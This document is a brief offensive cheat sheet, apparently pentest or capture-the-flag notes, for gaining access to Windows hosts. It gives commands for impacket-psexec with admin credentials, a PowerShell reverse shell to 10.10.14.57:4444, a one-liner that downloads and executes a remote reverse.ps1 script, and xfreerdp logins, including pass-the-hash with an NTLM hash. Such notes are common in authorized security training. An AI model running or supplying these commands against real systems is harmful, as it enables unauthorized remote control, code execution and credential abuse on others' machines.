# PSExec

```sh
impacket-psexec Administrator:'<password>'@$target
```

# PowerShell Reverse Shell

`Invoke-PowerShellTcp.ps1`

Add this line at the end of the script:

```bash
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.57 -Port 4444
```

On target:

```powershell
powershell iex(new-object net.webclient).downloadstring(\"http://10.10.14.57:8000/reverse.ps1\")
```

# RDP

## Connect
```sh
xfreerdp /v:<server_ip> /u:<username> /p:<password> +dynamic-resolution +clipboard
```
## RDP with SMB Share
```sh
xfreerdp3 /v:$target /u:'username' /p:'password' /cert:ignore +clipboard /dynamic-resolution /drive:/home/kali/Transfer,kalishare
```
## RDP with Pass-the-Hash
```sh
xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA
```